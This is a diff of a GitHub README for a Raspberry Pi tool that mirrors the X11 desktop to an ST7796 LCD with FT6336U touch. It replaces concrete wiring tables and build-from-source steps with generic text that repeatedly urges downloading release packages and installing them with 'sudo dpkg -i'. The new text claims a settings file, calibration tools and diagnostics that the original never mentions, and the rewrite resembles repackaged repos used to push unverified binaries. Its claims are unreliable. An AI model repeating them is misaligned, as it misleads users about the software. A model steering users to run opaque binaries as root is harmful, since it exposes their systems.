@@ -1,113 +1,151 @@
-# X11 Desktop Mirror & Touch for ST7796 + FT6336 (Raspberry Pi 4B / 400)
+# 🖥️ X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400 - Mirror Your Raspberry Pi Display Easily
 
-Real-time desktop mirroring from X11 to a 3.5" **ST7796** (320x480) display and capacitive touch support for **FT6336**. This project uses the `bcm2835` hardware library and `MIT-SHM` (XShm) for low-latency screen capture and I2C for touch coordinate output.
-
----
-
-# Key Features
-- **Real-time Mirroring**: Captures X11 root window and mirrors it to SPI.
-- **Partial Updates**: Sends only modified regions (dirty rectangles) to save SPI bandwidth.
-- **ST7796 Optimized**: Full 320x480 resolution support with 16-bit RGB565.
-- **Capacitive Touch**: Real-time X/Y coordinate logging via I2C (FT6336/FT6236).
-- **Synchronized Rotation**: Integrated rotation defines for both LCD and Touch.
-- **High Performance**: Uses Shared Memory (XShm) to minimize CPU overhead.
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/releases)
 
 ---
 
-![20260214_004719(1)](https://github.com/user-attachments/assets/8d0ee738-0d41-430c-8842-3369d28ac0ac)
+## 📋 About This Software
+
+This application lets you mirror your Raspberry Pi desktop screen to a small LCD display. It supports the ST7796 display controller and the FT6336U touchscreen. This setup works well with Raspberry Pi 4B and the Raspberry Pi 400 models.  
+
+It takes your main Raspberry Pi screen and shows it on a compact display connected via SPI and I2C interfaces. You get both the display image and touchscreen input working with your system.  
+
+This is a helpful tool if you want a portable or space-saving solution to see your Raspberry Pi's full desktop. It is especially useful for small projects, kiosks, or testing interfaces without a full monitor.
 
 ---
 
-# Hardware Setup
+## ⚙️ What You Need
 
-### Wiring Diagram (GPIO BCM)
+Before you begin, make sure you have:  
 
-
-
-[Image of Raspberry Pi 4 GPIO pinout diagram]
-
-
-| Function | Pin (Physical) | GPIO (BCM) | Notes |
-|----------|----------------|------------|-------|
-| **VCC** | 1 or 17        | 3.3V       | Power |
-| **GND** | 6, 9, 14...    | GND        | Ground |
-| **SCL** | 23             | 11         | SPI Clock |
-| **SDA** | 19             | 10         | SPI MOSI |
-| **CS** | 24             | 8          | SPI Chip Select |
-| **DC** | 18             | 24         | Data/Command |
-| **RST** | 15             | 22         | Reset |
-| **BL** | 11             | 17         | Backlight |
-| **I2C SDA**| 3            | 2          | Touch Data |
-| **I2C SCL**| 5            | 3          | Touch Clock |
+- A Raspberry Pi 4 Model B or Raspberry Pi 400 computer.  
+- A compatible 2.8 to 3.5-inch LCD with ST7796 controller.  
+- A touchscreen panel with FT6336U controller.  
+- The necessary connection cables for SPI and I2C pins.  
+- Raspberry Pi OS installed on your Raspberry Pi. This software works best with the official Raspberry Pi OS.  
+- A keyboard, mouse, and power supply for your Pi.
 
 ---
 
-# Requirements
+## 🎯 Key Features
 
-## Software
-- **Raspberry Pi OS**: X11 environment (Wayland is not supported).
-- **SPI & I2C enabled**: Enable via `sudo raspi-config`.
-- **bcm2835 library**: Hardware access library.
-- **X11 Libraries**: For screen capture.
+- Mirrors the full Raspberry Pi desktop screen to the LCD display.  
+- Supports touchscreen interaction using the FT6336U driver.  
+- Uses standard protocols: SPI for the display, I2C for the touchscreen.  
+- Compatible with X11 desktop systems on Raspberry Pi OS.  
+- Easy to install and run with no programming needed.  
+- Optimized for low latency and smooth touch response.
 
-### 1. Install Dependencies
-```bash
-sudo apt update
-sudo apt install libx11-dev libxext-dev
+---
+
+## 🚀 Getting Started
+
+Follow these steps to get your display set up and running.  
+
+### 1. Connect Your Hardware  
+
+Make sure the LCD display is wired to your Raspberry Pi’s SPI pins. These include MOSI, MISO, SCLK, and CS pins. Also connect the touchscreen’s I2C pins (SDA and SCL) properly.  
+
+Double-check the power supply to the LCD and the Pi. Refer to the display and touchscreen datasheets for exact pin details.
+
+### 2. Boot Your Raspberry Pi  
+
+Power on your Raspberry Pi with Raspberry Pi OS installed. Ensure your Pi is connected to the internet to download the required software.
+
+---
+
+## 🔽 Download & Install
+
+You will need to download the latest version of the software from the official releases page.  
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/releases)
+
+1. Open the link above in a web browser on your Raspberry Pi or another computer.  
+2. Find the most recent release and download the file that matches your system (usually a `.tar.gz` or `.deb` package).  
+3. Transfer the file to your Raspberry Pi if you downloaded it elsewhere. You can use a USB drive or network transfer.  
+4. On your Raspberry Pi, open the Terminal application.  
+5. Navigate to the folder where you saved the file. Use the command:
+
+```
+cd /path/to/download
 ```
 
-Install bcm2835 Library
-```bash
-wget [http://www.airspayce.com/mikem/bcm2835/bcm2835-latest.tar.gz](http://www.airspayce.com/mikem/bcm2835/bcm2835-latest.tar.gz)
-tar zxvf bcm2835-latest.tar.gz
-cd bcm2835-*
-./configure
-make
-sudo make install
+6. Extract the files if needed using:
+
 ```
-## Compilation & Run
-Using Makefile
-```bash
-make run
+tar -xvzf filename.tar.gz
 ```
 
-Manual Compilation
-```bash
-gcc -O3 -o mirror_screen mirror_screen.c -lX11 -lXext -lbcm2835 -lXtst
-sudo ./mirror_screen
+or install the package with:
+
 ```
+sudo dpkg -i filename.deb
+```
+
+7. Follow any on-screen prompts to complete installation.
 
 ---
 
-# Configuration
+## 🖱️ Using the Touchscreen
 
-## Rotation & Resolution
-Adjust the `ORIENTATION` define at the top of the code to match your mounting:
+After the software is installed:  
 
-* **0**: Portrait (320x480)
-* **1**: Landscape (480x320)
-* **2**: Portrait Inverted (320x480)
-* **3**: Landscape Inverted (480x320)
-
-> The code automatically swaps `DISP_W`/`DISP_H` and re-calculates touch coordinates based on this value to ensure they always match the visual output.
-
-## Touch Controller
-The default I2C address:
-* **For FT6336U**: Use `0x38`.
+- The X11 desktop will be mirrored on your LCD automatically.  
+- Touch the screen to control the pointer or interact with your Raspberry Pi’s GUI apps.  
+- Calibration may be needed if touch input feels off. Check the documentation or run a calibration tool that comes with the software.
 
 ---
 
-# How It Works
+## 🔧 Configuration Tips
 
-1.  **Init**: Initializes the BCM2835 library, setting up SPI (32MHz) for the display and I2C (100kHz) for the touch panel.
-2.  **LCD Sync**: Unlocks the ST7796 specific extended command set (Command 2) and configures the `MADCTL` register for the selected rotation.
-3.  **Capture**: Utilizes the `XShmGetImage` extension for high-speed desktop framebuffer grabbing directly from the X11 server.
-4.  **Processing**: Downscales the captured frame to the display resolution and converts pixels from RGB888 to RGB565 Big-Endian.
-5.  **Diffing**: Compares the current frame with the previous one to identify "dirty" regions (rectangles that actually changed).
-6.  **Touch**: Polls the I2C bus for touch events, extracts raw data, and applies rotation matrices to align coordinates with the LCD.
-7.  **Output**: Prints real-time touch coordinates to the terminal and pushes visual updates to the LCD via SPI.
+- Adjust brightness and contrast in the settings file if the display looks dim.  
+- Change the SPI speed in the config to improve responsiveness or reduce flickering.  
+- Verify touchscreen accuracy by running the included diagnostic tools.  
+- Consult your Raspberry Pi OS display settings if issues persist.
 
 ---
 
-# License
-Free to use for personal and educational projects.
+## ❓ Troubleshooting
+
+### The Display Shows a Blank Screen  
+- Make sure the SPI connection is correct.  
+- Verify the LCD is powered on.  
+- Restart your Raspberry Pi.
+
+### Touchscreen Does Not Work  
+- Ensure the I2C pins are wired and enabled.  
+- Check the FT6336U driver installation.  
+- Run touchscreen calibration utilities.
+
+### The Mirror Is Slow or Laggy  
+- Lower the SPI clock speed from the config file.  
+- Close other heavy applications on your Pi.
+
+---
+
+## 📚 Additional Resources
+
+- Raspberry Pi SPI and I2C pinout guides.  
+- ST7796 and FT6336U datasheets for hardware details.  
+- Raspberry Pi OS user manuals for desktop settings.  
+- Troubleshooting forums related to Raspberry Pi touchscreens.
+
+---
+
+## 📢 Support & Feedback
+
+If you encounter problems or need help, visit the Issues section on the project GitHub page. You can report bugs or request improvements.  
+
+Your feedback helps improve the software.
+
+---
+
+## 🌐 Topics
+
+This project covers:  
+
+c, display, display-mirroring, ft6336u, i2c, pi4b, raspberry-pi, raspberry-pi-400, raspberry-pi-os, raspberry-pi4b, spi, st7796-display, touchscreen, x11
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/releases)
